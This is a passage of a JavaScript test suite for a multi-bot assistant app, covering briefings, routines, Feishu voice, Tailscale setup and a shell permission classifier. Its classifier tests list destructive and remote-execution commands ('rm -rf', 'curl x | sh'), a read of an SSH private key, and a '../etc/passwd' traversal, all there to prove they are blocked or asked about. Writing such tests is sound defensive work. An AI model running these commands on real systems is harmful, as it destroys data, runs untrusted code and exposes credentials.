        { kind: 'user', turnId: 't0', text: B.BRIEFING_TAG + ' 写简报', ts: h(1) }, { kind: 'turn', turnId: 't0', status: 'success', summary: 'old brief', endedAt: h(1) },
        { kind: 'user', turnId: 't1', text: '查一下快递', source: 'feishu', ts: h(3) }, { kind: 'turn', turnId: 't1', status: 'success', summary: '快递明天到', endedAt: h(3) },
        { kind: 'user', turnId: 't2', text: '很久以前的事', ts: h(40) }, { kind: 'turn', turnId: 't2', status: 'success', summary: 'old', endedAt: h(40) },
      ],
      artist: [
        { kind: 'user', turnId: 'a1', text: '画封面', ts: h(5) }, { kind: 'turn', turnId: 'a1', status: 'failed', summary: '生图密钥失效', endedAt: h(5) },
      ],
      idle: [],
    };
    const data = await B.collectBriefing({
      hours: 24, now, machine: 'pc',
      listBots: async () => [{ id: 'chief', name: '助理' }, { id: 'artist', name: '美术' }, { id: 'idle', name: '闲着' }],
      readSession: async (id) => sessions[id] || [],
      approvals: { list: () => [{ botId: 'artist', toolName: 'shell', reason: '装软件', createdAt: h(2) }] },
      attention: { snapshot: () => ({ items: { 'bot:chief': { waiting: { kind: 'login', text: '等你登录京东' } } } }) },
      pages: { list: async () => [{ title: '周报', path: 'pages/weekly.html', botName: '助理', updatedAt: h(2) }, { title: '旧页', path: 'pages/old.html', updatedAt: h(50) }] },
      videoJobs: { list: () => [{ botId: 'artist', state: 'done', prompt: '小狗', path: 'videos/a.mp4', doneAt: now - 3600e3, createdAt: now - 7200e3 }] },
      routines: { list: () => [{ name: '每日简报', preset: 'briefing', enabled: true, runs: [] }, { name: '看价格', botId: 'chief', enabled: true, schedule: 'every 60 minutes', runs: [{ status: 'failed', summary: '网页打不开', endedAt: h(1) }] }] },
    });
    const chief = data.bots.find((b) => b.id === 'chief');
    check('briefing: facts cover the window only, and the briefing does not report on itself', chief?.turns === 1 && chief.work[0].result === '快递明天到' && chief.work[0].from === 'feishu' && !data.bots.find((b) => b.id === 'idle'));
    check('briefing: failures, approvals and waits for a login are listed for the human', data.bots.find((b) => b.id === 'artist')?.failed === 1 && data.waitingOnYou.some((w) => w.kind === 'approval' && w.bot === '美术') && data.waitingOnYou.some((w) => w.kind === 'login' && w.bot === '助理'));
    check('briefing: new pages, videos and routine failures are in; the briefing routine itself is not', data.pages.length === 1 && data.pages[0].path === 'pages/weekly.html' && data.videos[0]?.path === 'videos/a.mp4' && data.routines.length === 1 && data.routines[0].failed === 1);
    check('briefing: the instruction starts with the tag and asks for what needs the human first', B.briefingInstruction().startsWith(B.BRIEFING_TAG) && B.briefingInstruction().includes('briefing_collect'));
    // briefing_collect asks every machine; one that is away is named, not fatal.
    const T = await import('../src/tools.mjs');
    const fakePeers = {
      list: () => [{ name: 'ubuntu' }, { name: 'away' }],
      find: (n) => ({ name: n }),
      json: async (p) => { if (p.name === 'away') throw new Error('连不上'); return { machine: 'ubuntu', bots: [{ id: 'w', name: '编剧', turns: 2 }] }; },
    };
    const reg = T.createRegistry({ workspaceDir: process.cwd(), config: { policy: {} }, getRuntime: () => null, getBriefing: () => async () => ({ machine: 'pc', bots: [] }), getPeers: () => fakePeers });
    const all = await reg.get('briefing_collect').run({ hours: 12 }, { bot: { id: 'chief' } });
    check('briefing: briefing_collect covers this machine and every other one; an unreachable one is named', all.hours === 12 && all.machines.map((m) => m.machine).join(',') === 'pc,ubuntu' && all.unreachable?.[0]?.machine === 'away' && reg.isGranted({ tools: [] }, 'briefing_collect'));
    // Routines keep their options; a quiet run keeps the last report.
    const { RoutineStore } = await import('../src/routines.mjs');
    let next = { status: 'success', report: '价格 99 元' };
    const store = new RoutineStore({ config: {}, runner: async () => next });
    store.persist = async () => {};
    const rt = await store.create({ name: '看价格', instruction: '看一下价格', schedule: 'every 60 minutes', onlyChanges: true, pushFeishu: true });
    await store.fire(rt, 'test');
    next = { status: 'success', quiet: true, report: '没有变化' };
    const quietRun = (await store.fire(rt, 'test')).run;
    check('change-only: options are kept; a quiet run is marked and the last real result is remembered', rt.onlyChanges && rt.pushFeishu && quietRun.quiet && rt.lastReport === '价格 99 元');
    await store.update(rt.id, { onlyChanges: false });
    check('change-only: the option can be turned off', rt.onlyChanges === false && rt.pushFeishu === true);
    // A quiet run leaves no "new result" badge.
    const { EventBus } = await import('../src/store.mjs');
    const { createAttention } = await import('../src/attention.mjs');
    const fsx = await import('node:fs');
    const abus = new EventBus();
    const att = createAttention({ file: path.join(fsx.mkdtempSync(path.join(os.tmpdir(), 'att14-')), 'a.json'), bus: abus });
    await att.load();
    abus.emit({ type: 'turn.end', botId: 'chief', turnId: 'r1', summary: '没有变化' });
    const before = Boolean(att.snapshot().items['bot:chief']?.unread);
    att.quiet('bot:chief');
    check('change-only: a quiet run leaves no "new result" badge', before && !att.snapshot().items['bot:chief']);
    const srv = await readText('../src/server.mjs');
    check('change-only: the run is told the last result and may answer "没有变化"; then no badge and no Feishu push', srv.includes('只回复「没有变化」四个字') && srv.includes("attention.quiet(") && srv.includes('else if (routine.pushFeishu && report && refs.feishu)'));
    const agentSrc14 = await readText('../src/agent.mjs');
    check('change-only: "no change" counts only when the run really checked (used a tool); otherwise it runs once more', srv.includes('NO_CHANGE.test(report) && tools === 0') && srv.includes('NO_CHANGE.test(report) && tools > 0') && srv.includes('不要凭聊天记录判断'));
    check('change-only: the last result goes to the model only, not into the chat', srv.includes('hiddenNote: changeNote') && agentSrc14.includes("content: String(text) + (hiddenNote ?") && agentSrc14.includes("await this.record(bot.id, { kind: 'user', text: String(text), turnId, source });"));
    const fsSrc = await readText('../src/feishu.mjs');
    check('feishu: results can go to every paired person directly (open_id)', fsSrc.includes('receive_id_type=open_id') && fsSrc.includes('async push(text)'));
    // Routes.
    const bad = await api('/api/briefing', { method: 'PUT', body: { enabled: true, time: '25:00' } });
    const on = await api('/api/briefing', { method: 'PUT', body: { enabled: true, time: '7:05', feishu: true } });
    const list = await api('/api/routines');
    const briefRoutine = (list.json || []).find((r) => r.preset === 'briefing');
    check('briefing: one switch makes one routine (07:05 daily, Feishu on); a bad time is refused', bad.status === 400 && on.json?.enabled && on.json.time === '07:05' && on.json.feishu && briefRoutine?.schedule === '5 7 * * *' && briefRoutine.pushFeishu);
    const again = await api('/api/briefing', { method: 'PUT', body: { enabled: false, time: '08:30' } });
    const list2 = await api('/api/routines');
    check('briefing: switching it again updates the same routine, never a second one', !again.json?.enabled && (list2.json || []).filter((r) => r.preset === 'briefing').length === 1);
    const facts = await api('/api/briefing/data?hours=6');
    check('briefing: each machine answers with its own facts', facts.status === 200 && Array.isArray(facts.json?.bots) && 'waitingOnYou' in facts.json);
    await api(`/api/routines/${encodeURIComponent(briefRoutine.id)}`, { method: 'DELETE' });
    const page = await readText('../public/index.html');
    check('briefing: the 任务 panel has the switch, time, Feishu and a try-now button; routines get the two options', ['brief-on', 'brief-time', 'brief-feishu', 'brief-try', 'rt-only-changes', 'rt-feishu'].every((id) => page.includes(`id="${id}"`)) && page.includes('没有变化（没打扰你）'));
  }
  // Step 15: replies read aloud, voice messages in Feishu, files on other machines.
  {
    const V = await import('../src/voice.mjs');
    const said = V.speakableText('## 结果\n已保存到 `pages/a.html`，见 https://x.com/a 。\n- **第一**：好\n```js\nx\n```\n共 3 个文件 artifacts/x.png');
    check('read aloud: code, links, paths and markdown marks are not read out', !/[#*`]|https?:|pages\/|artifacts\//.test(said) && said.includes('第一：好') && said.includes('（代码略）'));
    check('read aloud: a long reply is cut at a sentence and says the rest is in the text', V.speakableText('很长的一句话。'.repeat(200), 100).endsWith('……后面的内容请看文字。') && V.speakableText('很长的一句话。'.repeat(200), 100).length < 130);
    const sf = { baseUrl: 'https://api.siliconflow.cn/v1', apiKey: 'k' };
    check('read aloud: SiliconFlow offers CosyVoice voices (a chosen one sticks); a service without speech offers none', V.ttsFor(sf, {}).voice.endsWith(':anna') && V.ttsFor(sf, { ttsVoice: 'FunAudioLLM/CosyVoice2-0.5B:alex' }).voice.endsWith(':alex') && V.ttsFor({ baseUrl: 'https://api.groq.com/openai/v1', apiKey: 'k' }, {}) === null && V.ttsFor(null) === null);
    let sentBody = null;
    const okFetch = async (url, init) => { sentBody = { url, ...JSON.parse(init.body) }; return { ok: true, arrayBuffer: async () => new Uint8Array([1, 2, 3]).buffer }; };
    const audio = await V.speak(V.ttsFor(sf, {}), '你好', { format: 'opus', fetchImpl: okFetch });
    check('read aloud: speech is an OpenAI-style /audio/speech call with model, voice and format', audio.length === 3 && sentBody.url.endsWith('/audio/speech') && sentBody.model === 'FunAudioLLM/CosyVoice2-0.5B' && sentBody.response_format === 'opus' && sentBody.input === '你好');
    let code = '';
    try { await V.speak(V.ttsFor(sf, {}), '你好', { fetchImpl: async () => ({ ok: false, status: 401, text: async () => '{"message":"bad key"}' }) }); } catch (e) { code = e.code; }
    check('read aloud: a bad key says so', code === 'TTS_FAILED');
    // An Ogg/Opus length: 2 s of 48 kHz granules after a 312-sample pre-skip.
    const head = Buffer.concat([Buffer.from('OggS'), Buffer.alloc(24), Buffer.from('OpusHead'), Buffer.from([1, 1]), Buffer.from([312 & 255, 312 >> 8])]);
    const last = Buffer.concat([Buffer.from('OggS'), Buffer.from([0, 0]), Buffer.alloc(8)]);
    last.writeBigUInt64LE(BigInt(2 * 48000 + 312), 6);
    check('voice messages: the length of an Opus clip is read from the file', V.oggDurationMs(Buffer.concat([head, Buffer.alloc(50), last])) === 2000 && V.oggDurationMs(Buffer.from('nope')) === 0);
    const heard = await V.transcribe({ baseUrl: 'x', model: 'm', apiKey: 'k' }, Buffer.from([1]), 'audio/ogg', { fetchImpl: async () => ({ ok: true, text: async () => JSON.stringify({ text: '<|zh|><|HAPPY|>你好呀😊' }) }) });
    check('voice input: tags and emotion emoji are taken off the words', heard.text === '你好呀');
    // Routes: no speech service -> a clear refusal; the voice choice is saved.
    const spoke = await api('/api/voice/speak', { method: 'POST', body: { text: '你好' } });
    const vset = await api('/api/voice', { method: 'PUT', body: { ttsVoice: 'FunAudioLLM/CosyVoice2-0.5B:alex' } });
    check('read aloud: the route refuses clearly without a speech service; the voice choice is accepted', (spoke.status === 409 || spoke.status === 200) && vset.status === 200 && 'tts' in (vset.json || {}));
    // Feishu: a voice question is transcribed, and answered with text and a voice message.
    const FS = await import('../src/feishu.mjs');
    const { EventBus } = await import('../src/store.mjs');
    const fsx = await import('node:fs');
    const fdir = fsx.mkdtempSync(path.join(os.tmpdir(), 'feishu-voice-'));
    const out = [];
    const uploads = [];
    const fake = async (url, init = {}) => {
      const ok = (data) => ({ ok: true, status: 200, json: async () => ({ code: 0, ...data }), arrayBuffer: async () => new Uint8Array([9, 9]).buffer });
      if (url.includes('tenant_access_token')) return ok({ tenant_access_token: 't', expire: 7200 });
      if (url.includes('/resources/')) return ok({});
      if (url.includes('/im/v1/files')) { uploads.push({ type: init.body.get('file_type'), duration: init.body.get('duration') }); return ok({ data: { file_key: 'fk_1' } }); }
      if (url.includes('/im/v1/messages')) { const b = JSON.parse(init.body); out.push(b.msg_type); return ok({ data: {} }); }
      return ok({ data: {} });
    };
    const fbus = new EventBus();
    const turns = [];
    const f2 = FS.createFeishu({
      file: path.join(fdir, 'feishu.json'), bus: fbus, workspaceDir: fdir, fetchImpl: fake,
      runtime: { runTurn: async (t) => { turns.push(t); return t; } },
      approvals: { resolve: () => {} }, getBots: () => [{ id: 'chief', primary: true }], machineName: () => '测试机',
      transcribe: async (bytes, mime) => ({ text: mime === 'audio/ogg' && bytes.length === 2 ? '明天天气怎么样' : '' }),
      speak: async (text) => ({ bytes: Buffer.from(text), durationMs: 1500 }),
    });
    await f2.load();
    await f2.update({ appId: 'cli_v', appSecret: 'sec-v' });
    const frame = (n, type, content) => FS.encodeFrame({ method: 1, headers: [{ key: 'type', value: 'event' }, { key: 'message_id', value: 'v' + n }], payload: Buffer.from(JSON.stringify({ header: { event_id: 've' + n, event_type: 'im.message.receive_v1' }, event: { sender: { sender_id: { open_id: 'ou_v' }, sender_type: 'user' }, message: { message_id: 'vm' + n, chat_id: 'oc_v', chat_type: 'p2p', message_type: type, content: JSON.stringify(content) } } })) });
    f2._handleFrame(frame(1, 'text', { text: '配对 ' + f2.view().pairCode }));
    await new Promise((r) => setTimeout(r, 40));
    f2._handleFrame(frame(2, 'audio', { file_key: 'ak_1', duration: 2000 }));
    await new Promise((r) => setTimeout(r, 40));
    const vt = turns.at(-1);
    check('feishu: a voice message is transcribed and runs a turn', vt && /明天天气怎么样/.test(vt.text) && vt.source === 'feishu');
    fbus.emit({ type: 'message', turnId: vt.turnId, botId: 'chief', text: '明天晴，25 度。' });
    fbus.emit({ type: 'turn.end', turnId: vt.turnId, botId: 'chief', summary: '明天晴' });
    await new Promise((r) => setTimeout(r, 80));
    check('feishu: asked by voice, answered with the text and a voice message (Opus, with its length)', out.includes('post') && out.includes('audio') && uploads.some((u) => u.type === 'opus' && u.duration === '1500'));
    f2.stop();
    // Files on other machines: located and fetched over the peer link, never served as something that runs here.
    const loc = await api('/api/peers/locate?path=../etc/passwd');
    const none = await api('/api/peers/locate?path=pages/nowhere.html');
    check('other machines: a path outside the workspace is refused; a file no machine has is a 404', loc.status === 400 && none.status === 404);
    const srv = await readText('../src/server.mjs');
    check('other machines: pages from there stay sandboxed; HTML/SVG/XML from there is never served as such', srv.includes('? { ...PAGE_HEADERS }') && srv.includes("/html|svg|xml|javascript/i.test(r.headers.get('content-type') || '') ? 'text/plain; charset=utf-8'"));
    const page = await readText('../public/index.html');
    check('other machines: a picture, video or page not here is looked for on the other machines', page.includes('function findElsewhere(path)') && (page.match(/findElsewhere\(file\.path\)/g) || []).length >= 3 && page.includes('openPageViewer(file.page, elsewhereTitles.get(file.path) || null, card.dataset.machine)'));
    check('read aloud: while anything is read, a bar above the message box stops it; Esc and switching chats stop it too; a stop ends the rest of that answer', page.includes('id="speak-bar"') && page.includes("$('speak-stop')?.addEventListener('click', stopSpeaking)") && page.includes("event.key === 'Escape' && (speech.playing || speech.loading)") && page.includes('if (id !== state.botId) stopSpeaking();') && page.includes('if (id !== state.groupId) stopSpeaking();') && page.includes('state.readAloudTurn = false;') && page.includes('if ((speech.stopped || 0) > asked) return;'));
    check('read aloud: replies get a button; the answer to a spoken (or, by choice, any) question is read aloud', page.includes('bubble.appendChild(speakButton(text))') && page.includes("const readThis = mode === 'always' || (mode === 'voice' && voice.spokeSinceSend);") && page.includes('id="tts-voice"') && page.includes('id="tts-auto"'));
  }
  // Tailscale key on a real machine: the write must end its input (cat waits for it), and a failure is said.
  {
    const RM = await import('../src/remote.mjs');
    const { EventEmitter } = await import('node:events');
    // Like "cat > file": closes only after its input ends.
    const catClient = { exec: (_cmd, cb) => { const s = new EventEmitter(); let got = ''; s.write = (d) => { got += d; }; s.end = () => setTimeout(() => s.emit('close', got.includes('tskey') ? 0 : 1), 5); s.stderr = new EventEmitter(); cb(null, s); } };
    const ended = await RM._execStream(catClient, 'cat > f', { stdin: 'tskey-auth-x\n', endInput: true, timeoutMs: 500 }).then((r) => r.code, (e) => e.code);
    const hung = await RM._execStream(catClient, 'cat > f', { stdin: 'tskey-auth-x\n', timeoutMs: 300 }).then((r) => r.code, (e) => e.code);
    check('tailscale key: the key write closes its input (without that, cat waits and times out)', ended === 0 && hung === 'REMOTE_TIMEOUT');
    const rm = await readText('../src/remote.mjs');
    check('tailscale key: a key that did not reach the machine, or a script that did not start Tailscale, is reported (never skipped silently)', rm.includes('endInput: true, timeoutMs: 15000') && rm.includes("Tailscale 没装：密钥没能交给那台机器") && rm.includes("'Tailscale 没装：安装脚本没有收到密钥'") && rm.includes("if (/没装/.test(job.tailscale) && job.state === 'done') job.state = 'warning';") && rm.includes("tailscale: job.tailscale || ''"));
    const ui = await readText('../public/index.html');
    check('tailscale key: the add-machine dialog says how Tailscale went', ui.includes("job.tailscale ? "));
  }
  // Step 16: chat fixes (cut-off tool calls, cards, the working hint, new bots, opening files, video progress).
  {
    const MD = await import('../src/model.mjs');
    check('cut-off calls: arguments that do not parse are marked as cut off, never passed on as {}', MD.toolArgs('{"title":"x","html":"<h1>very lo').__truncated === true && MD.toolArgs('{"a":1}').a === 1 && Object.keys(MD.toolArgs('')).length === 0);
    const agentSrc = await readText('../src/agent.mjs');
    check('cut-off calls: the bot is told it was cut off and how to do it in parts', agentSrc.includes("code: 'ARGS_TRUNCATED'") && agentSrc.includes('fs_write (mode "append" for the next parts)'));
    const T = await import('../src/tools.mjs');
    const { createPages } = await import('../src/pages.mjs');
    const fsx = await import('node:fs');
    const ws = fsx.mkdtempSync(path.join(os.tmpdir(), 'ws16-'));
    fsx.writeFileSync(path.join(ws, 'long.html'), '<h1>长页面</h1>' + '<p>段落</p>'.repeat(500));
    const reg = T.createRegistry({ workspaceDir: ws, config: { policy: {} }, getRuntime: () => null, getPages: () => createPages({ workspaceDir: ws }) });
    const saved = await reg.get('page_save').run({ title: '长页面', file: 'long.html', name: 'long-page' }, { bot: { id: 'b' }, workspaceDir: ws });
    let emptyMsg = '';
    try { await reg.get('page_save').run({ title: 'x' }, { bot: { id: 'b' }, workspaceDir: ws }); } catch (e) { emptyMsg = e.code + ' ' + e.message; }
    check('pages: a long page can be saved from a workspace file; an empty one says how to do it', saved.path === 'pages/long-page.html' && fsx.readFileSync(path.join(ws, saved.path), 'utf8').includes('长页面') && emptyMsg.startsWith('PAGE_EMPTY') && emptyMsg.includes('pass file'));
    const page = await readText('../public/index.html');
    check('stuck: three identical calls read as "同一个操作重复了", not as the step limit', page.includes("item.status === 'max_steps' && /^Stopped: repeated /.test(item.summary || '')") && page.includes('同一个操作重复了，先停下了'));
    check('cards: a takeover/login card follows what the bot said in that turn, in the replies\' column', page.includes('if (last > i) { items.splice(i, 1); items.splice(last, 0, it); }') && page.includes("const row = el('div', 'row assistant card-row');"));
    check('working hint: always under the newest message, also after the human sends one', page.includes('if (messagesEl.lastElementChild !== row) messagesEl.appendChild(row);') && page.includes('keepTypingLast();\n  scrollToBottom(true);'));
    const ti = page.indexOf('const TOOL_TEXT');
    const labelled = new Set([...page.slice(ti, page.indexOf('\n};', ti)).matchAll(/^  ([a-z_]+):/gm)].map((m) => m[1]));
    const toolSrc = await readText('../src/tools.mjs');
    const unlabelled = [...toolSrc.matchAll(/name: '([a-z_]+)',\n\s+description/g)].map((m) => m[1]).filter((n) => !labelled.has(n));
    check('working hint: every tool has a Chinese name (no "正在image_view…")', unlabelled.length === 0, unlabelled.join(','));
    check('fullscreen: the "我弄好了，继续" button is readable (not white on the near-white accent)', /\.pc-done \{[^}]*background: #fff; color: #0a0a0a;/.test(page));
    check('new bots: a specialist\'s empty chat is its own greeting with starts from its role; the primary bot is listed first', page.includes('if (bot && !bot.primary) return specialistWelcome(bot);') && page.includes('Number(Boolean(b.primary)) - Number(Boolean(a.primary))'));
    const main = await readText('../desktop/main.mjs');
    check('open files: the desktop app opens a workspace file or shows it in its folder, only inside the workspace, only on this computer', main.includes("ipcMain.handle('desk:open-file'") && main.includes("if (abs !== root && !abs.startsWith(root + path.sep)) return { ok: false, error: 'outside the workspace' };") && page.includes('return Boolean(window.desk?.openFile) && onLocalMachine();'));
    const jobs = await api('/api/media/jobs?botId=chief');
    check('video progress: the chat asks how its videos are going, with a typical time from recent ones', jobs.status === 200 && Array.isArray(jobs.json?.jobs) && 'typicalSec' in (jobs.json || {}) && page.includes('async function renderVideoJobs()') && page.includes("'通常 3–15 分钟'"), `status ${jobs.status} ${JSON.stringify(jobs.json).slice(0,160)}`);
    const srv = await readText('../src/server.mjs');
    check('other machines: a page found there keeps its own title', srv.includes("find((x) => x.name === page)?.title") && page.includes('elsewhereTitles.get(file.path)'));
    check('switching chats: a slow machine\'s late answer for a chat already left is not shown in the new one', page.includes('if (state.botId !== botId || isGroupMode()) return;\n  state.messages = messages;'));
    const fsSrc = await readText('../src/feishu.mjs');
    check('feishu: the bot is told the channel carries pictures, videos and voice (it said "only text")', fsSrc.includes('飞书这条通道能收文字、图片和语音') && fsSrc.includes('所以别说飞书只能发文字'));
  }
  // Step 17: settings and permissions (live model list, key boxes, looking around, generation, Windows add).
  {
    const PR = await import('../src/providers.mjs');
    let seen = null;
    const fakeModels = async (url, init) => { seen = { url, init }; return { ok: true, status: 200, json: async () => ({ data: [{ id: 'deepseek-flash' }, { id: 'deepseek-v4-pro' }, { id: 'text-embedding-3' }, { id: 'whisper-1' }] }) }; };
    const live = await PR.fetchProviderModels({ provider: 'deepseek', apiKey: 'k1', fetchImpl: fakeModels });
    check('models: the list comes from the provider itself, chat models only', live.models.join(',') === 'deepseek-flash,deepseek-v4-pro' && seen.url === 'https://api.deepseek.com/v1/models' && seen.init.headers.authorization === 'Bearer k1');
    await PR.fetchProviderModels({ provider: 'anthropic', apiKey: 'k2', fetchImpl: fakeModels });
    check('models: Claude is asked with its own headers', seen.init.headers['x-api-key'] === 'k2' && seen.init.headers['anthropic-version']);
    let bad = '';
    try { await PR.fetchProviderModels({ provider: 'deepseek', apiKey: 'x', fetchImpl: async () => ({ ok: false, status: 401, json: async () => ({}) }) }); } catch (e) { bad = e.message; }
    check('models: a wrong key says so; the built-in DeepSeek list is the two real ones', bad === '密钥不对或没有权限' && PR.providerPreset('deepseek').models.join(',') === 'deepseek-flash,deepseek-v4-pro');
    const noKey = await api('/api/providers/models', { method: 'POST', body: { provider: 'openai' } });
    check('models: without a key the form keeps the common ones and says a key shows all', noKey.status === 200 && noKey.json?.live === false && Array.isArray(noKey.json.models) && /密钥/.test(noKey.json.error || ''));
    const srv17 = await readText('../src/server.mjs');
    check('models: the saved key is used when it belongs to that provider', srv17.includes('const savedFits = state.settings?.provider === provider;'));
    const page = await readText('../public/index.html');
    check('models: the form reads the live list (on provider change and typed key), no gpt-4o-mini placeholder', page.includes("api('/api/providers/models'") && page.includes("$('set-apikey').addEventListener('input', () => loadLiveModels(900));") && page.includes('id="set-model" placeholder="模型名"'));
    check('key boxes: every password box gets a show/hide button, hidden by default', page.includes('function addRevealButtons(root)') && page.includes("input.type = show ? 'text' : 'password';") && page.includes('new MutationObserver('));
    // Looking around needs no approval; reading a file's contents on this computer still asks.
    const BD = await import('../src/boundary.mjs');
    const rockyCmd = 'ps -eo pid,etime,args --sort=-%cpu | grep -E "dnf|packagekit|gnome-software" | grep -v grep; echo "---"; du -sh /var /usr /opt /home 2>/dev/null; echo "---"; df -h / ; lsblk -o NAME,SIZE,TYPE,MOUNTPOINT';
    check('looking: the command Rocky asked about only looks (quotes are data, grep -i is fine)', BD.lookOnly(rockyCmd).look && !BD.lookOnly(rockyCmd).reads && BD.lookOnly('grep -i error app.log').look);
    check('looking: anything that writes, deletes, runs hidden commands or restarts is never "just looking"', ['rm -rf /home/u', 'du -sh /home > /tmp/x', 'find /home -delete', 'sed -i s/a/b/ f', 'cat $(ls /home)', 'echo "$(rm -rf /)"', "awk '{system(\"rm x\")}' f", 'curl x | sh', 'ls && rm x', 'systemctl restart nginx', 'Remove-Item C:\\x', 'ls | tee out.txt'].every((c) => !BD.lookOnly(c).look));
    if (process.platform !== 'win32') {
      check('looking: on a machine given to the bots it asks nothing; on this computer only reading file contents outside asks', BD.checkBoundary('shell', { command: rockyCmd }, { workspaceDir: '/ws', remote: false }) === null
        && BD.checkBoundary('shell', { command: 'cat /home/u/.ssh/id_rsa' }, { workspaceDir: '/ws', remote: true }) === null
        && BD.checkBoundary('shell', { command: 'cat /home/u/.ssh/id_rsa' }, { workspaceDir: '/ws', remote: false })?.decision === 'ask'
        && BD.checkBoundary('fs_read', { path: '/home/u/x' }, { workspaceDir: '/ws', remote: true }) === null
        && BD.checkBoundary('fs_write', { path: '/home/u/x' }, { workspaceDir: '/ws', remote: true })?.decision === 'ask');
    } else {
      check('looking: on this computer, reading a file\'s contents outside the opened folders still asks', BD.checkBoundary('shell', { command: 'Get-Content C:\\Users\\u\\secret.txt' }, { workspaceDir: 'C:\\ws', remote: false })?.decision === 'ask' && BD.checkBoundary('shell', { command: 'Get-Content C:\\Users\\u\\secret.txt' }, { workspaceDir: 'C:\\ws', remote: true }) === null);
    }
    // Generation: the human's choice.
    const g1 = await api('/api/policy', { method: 'PUT', body: { generate: 'ask' } });
    const g2 = await api('/api/policy', { method: 'PUT', body: { generate: 'nope' } });
    await api('/api/policy', { method: 'PUT', body: { generate: 'level' } });
    const agentSrc = await readText('../src/agent.mjs');
    check('generation: ask every time / follow the level / just make them; a one-sentence rule can still ask', g1.json?.generate === 'ask' && g2.status === 400 && agentSrc.indexOf("if (generate === 'ask')") < agentSrc.indexOf("// The human's one-sentence rules") && page.includes('name="generate-mode"'));
    // Adding a Windows machine: wait for the hub, then the code; say which check failed.
    const ps1 = await readText('../hub/setup-windows.ps1');
    const rm = await readText('../src/remote.mjs');
    check('windows add: the self-check waits for the hub (up to 4 min) before reading the pairing code, and says which check failed', ps1.indexOf('TotalSeconds -lt 240') > 0 && ps1.indexOf('TotalSeconds -lt 240') < ps1.indexOf("$code = ''") && ps1.includes('Hub 已经应答，但没读到它的配对码') && rm.includes("'服务起来了，但没读到配对码'") && rm.includes("'夜班服务没能启动起来或没有应答'"));
  }
  // Step 18: cloud hosts, Tailscale on Windows and on machines already added, Rocky 10, busy machines.
  {
    const page = await readText('../public/index.html');
    const fnSrc = /function isPublicAddress\(host\) \{[\s\S]*?\n\}\n/.exec(page)?.[0] || '';
    const isPublic = new Function(fnSrc + 'return isPublicAddress;')();
    check('cloud hosts: a public address is told apart from the LAN, Tailscale and this computer', isPublic('47.100.1.2') && isPublic('my-vps.example.com') && !isPublic('192.168.1.20') && !isPublic('10.0.0.5') && !isPublic('172.20.1.1') && !isPublic('100.100.1.2') && !isPublic('localhost') && !isPublic('win11') && !isPublic('box.tail1234.ts.net'));
    check('cloud hosts: adding one warns the connection is not encrypted and opens the Tailscale option; settings say so too', page.includes('id="vnc-public"') && page.includes("if (pub) $('vnc-ts').open = true;") && page.includes('这台机器用的是公网地址：连接没有加密'));
    const RM = await import('../src/remote.mjs');
    check('tailscale: the device is named after the machine (letters, digits, dashes)', RM.tailscaleDeviceName('Rocky') === 'rocky' && RM.tailscaleDeviceName('My Box 2') === 'my-box-2' && RM.tailscaleDeviceName('动画机') === '');
    const ps = await readText('../hub/tailscale-windows.ps1');
    const winSetup = await readText('../hub/setup-windows.ps1');
    const rm = await readText('../src/remote.mjs');
    check('tailscale on Windows: ASCII-only installer (PowerShell 5 safe), key from a file, unattended, key removed', ![...ps].some((c) => c.charCodeAt(0) > 127) && ps.includes('"--auth-key=file:$KeyFile"') && ps.includes("'--unattended'") && ps.includes('Remove-Item -Force $KeyFile'));
    check('tailscale on Windows: the key goes over SSH stdin into an admins-only file, and setup starts the installer', rm.includes("icacls $p /inheritance:r /grant:r 'Administrators:F' 'SYSTEM:F'") && rm.includes('endInput: true, timeoutMs: 30000') && winSetup.includes('[string]$TailscaleKeyFile') && winSetup.includes("hub\\tailscale-windows.ps1"));
    check('tailscale on Windows: the installer downloads with curl.exe (PowerShell 5 downloads crawl), and a key that waits for the last step is not taken away', ps.includes("'System32\\curl.exe'") && ps.includes("$ProgressPreference = 'SilentlyContinue'") && (await readText('../src/server.mjs')).includes('if (/^start \\d{4}-/m.test(log)) return;'));
    const ts = await api('/api/tailscale');
    const local = await api('/api/tailscale/install', { method: 'POST', body: { authKey: 'tskey-auth-abcdefghijkl' } });
    check('tailscale on a machine already added: offered only on machines given to the bots; this computer is told to install the app', ts.status === 200 && ts.json?.canInstall === false && 'status' in ts.json && local.status === 400 && local.json?.error?.code === 'TS_LOCAL');
    const srv = await readText('../src/server.mjs');
    check('tailscale on a machine already added: key file 0600, sudo -n systemd-run on Linux, the installer on Windows; results worded from DESK_TS codes', srv.includes('{ mode: 0o600 }') && srv.includes("spawnChild('sudo', ['-n', 'systemd-run'") && srv.includes("path.join(hubDir, 'tailscale-windows.ps1')") && srv.includes("m[2] === 'key' ?") && page.includes("api('/api/tailscale/install'"));
    const winLaunch = srv.split('\n').find((l) => l.includes("'tailscale-windows.ps1'), '-KeyFile', keyFile")) || '';
    check('tailscale on a machine already added: Windows launches the installer attached (a detached one runs nothing from the hub task); a key the installer never took is deleted after 90 s and reported', winLaunch && !winLaunch.includes('detached: true') && srv.includes('if (!fs.existsSync(keyFile)) return;') && srv.includes('DESK_TS=failed launch') && srv.includes('const TS_LAUNCH_FAILED'));
    const sh = await readText('../hub/setup-linux.sh');
    check('Rocky / RHEL 10: no X11 stack, so Wayland screens (cage + wayvnc) instead of "not supported"; the UI still knows the unsupported state for older hubs', sh.includes('EL_MAJOR:-0}" -ge 10 ]; then') && sh.includes('pm_install cage wayvnc') && page.includes("setup.state === 'unsupported'"));
    const h = await api('/api/health');
    check('busy machines: health reports CPU, cores and memory; the page warns when it stays near 100%', h.json?.load && typeof h.json.load.cores === 'number' && typeof h.json.load.memFreeMB === 'number' && 'busy' in h.json.load && page.includes('async function checkBusy()') && page.includes('id="busy-banner"'));
  }
  // Step 19: working across machines II (files travel with hand-offs, groups span machines, Feishu reaches any bot).
  {
    const fsx = await import('node:fs');
    const X = await import('../src/crossmachine.mjs');
    const { createPeers } = await import('../src/peers.mjs');
    check('carry files: workspace paths in a text are found once each, never outside paths', X.pathsIn('把 notes/分镜.md 和 art/key.png 交给它（notes/分镜.md），别碰 ../x/y.txt').join(',') === 'notes/分镜.md,art/key.png');
    // A stand-in machine with one bot that answers naming a file it made.
    const TOKEN = 'peer-token-19-abcdef';
    const got = { uploads: [], messages: [] };
    const srv19 = http.createServer(async (req, res) => {
      const chunks = []; for await (const c of req) chunks.push(c);
      const body = Buffer.concat(chunks);
      const send = (code, obj) => { res.writeHead(code, { 'content-type': 'application/json' }); res.end(JSON.stringify(obj)); };
      if (req.headers.authorization !== 'Bearer ' + TOKEN) return send(401, {});
